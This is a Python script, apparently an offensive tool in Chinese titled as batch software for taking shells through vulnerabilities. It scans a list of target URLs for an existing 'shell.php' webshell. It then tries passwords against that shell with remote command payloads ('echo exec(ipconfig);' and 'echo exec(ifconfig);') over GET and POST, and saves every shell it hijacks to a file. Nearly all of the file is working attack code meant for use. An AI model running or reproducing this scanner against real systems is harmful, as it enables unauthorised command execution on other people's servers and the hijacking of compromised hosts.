# -*- coding:UTF-8 -*-
#*********************************************
#------->>>>>>Author:秋某人的傻逼               *
#------->>>>>>Name:熊猫最爱皮卡丘                 *
#------->>>>>>Target:批量漏洞拿shell软件        *
#*********************************************
#-------------//-------------
# 导入 url   |    进行扫描常见shell    |    破解shell密码      |       输出有用shell
#--------------//-----------------
import re
import requests
import json
def webshellscan(urls):
    #-------------//-------------
    common_shell = ['shell.php']
    brup_pass = ['9090']
    #--------------//-----------------

    #urls = input('请输入url路径：例如 D:\\\\admin\\\\1.txt:')

    for i in  open(urls,'r') :
        try:
            #print ('[info:]TargetUrl:' + i)
            for m in common_shell:
                #print ('[info:]Payload:'+ m)
                headers = {
                           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36',
                           }
                req = requests.get( i.strip() + m,headers = headers)
                req404 = requests.get(i.strip() + '/404.html',headers = headers)
                if req.status_code == 200:
                    print('存在shell，进行爆破...')
                    for n in brup_pass:
                        getdata = n + '=echo exec(ipconfig);'
                        postdata = {n:'echo exec(ipconfig);'}
                        req_win = requests.get(i.strip() + m + '?' + getdata, headers=headers)
                        post_win_req = requests.post(i.strip() + m,data = postdata,headers = headers)
                        if post_win_req:
                            pattern = r'\d+.\d+.\d+.\d+'
                            res1 = req_win.content
                            res1_match = re.search(pattern, res1.decode())
                            res1_post = post_win_req.text.encode('UTF-8')
                            print ('爆破Payload：' + str(res1_post) + '爆破结果如下：')
                            res1_post_match = re.search(pattern, str(res1_post))
                            if res1_match:
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：GET')
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：GET',file=open('webshell.txt','w+'))
                            elif res1_post_match:
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：POST')
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：POST',file=open('webshell.txt','w+'))
                            else:
                                print('shell爆破失败，payload：' + i.strip() + m + '|' +'payload:' + n)
                        else:
                            print ('返回值为空！')
                        getdata_linux = n + '=echo exec(ifconfig);'
                        postdata_linux = {n:'echo exec(ifconfig);'}
                        req_linux = requests.get(i.strip() + m + '?' + getdata_linux, headers=headers)
                        post_linux_req = requests.post(i.strip() + m, data = postdata_linux, headers=headers)
                        res2 = req_win.text
                        if post_linux_req:
                            pattern = r'\d+.\d+.\d+.\d+'
                            req_linux = req_linux.content
                            req_linux_match = re.search(pattern,req_linux.decode())
                            res2_post = post_linux_req.text
                            print ('爆破Payload：' + str(res2_post) + '爆破结果如下：')
                            res2_post_match = re.search(pattern, res2_post)
                            if req_linux_match:
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：GET')
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：GET',file=open('webshell.txt','w+'))
                            elif res2_post_match:
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：POST')
                                print('shell爆破成功，payload：' + i.strip() + m + '|' +'payload:' + n + '|' + '类型：POST',file=open('webshell.txt','w+'))
                            else:
                                print('shell爆破失败，payload：' + i.strip() + m + '|' +'payload:' + n)
                        else:
                            print ('返回值为空！')
                else:
                    print ('shell不存在！，payload：' + i.strip() + m)
        except Exception as e:
           print (e)
           continue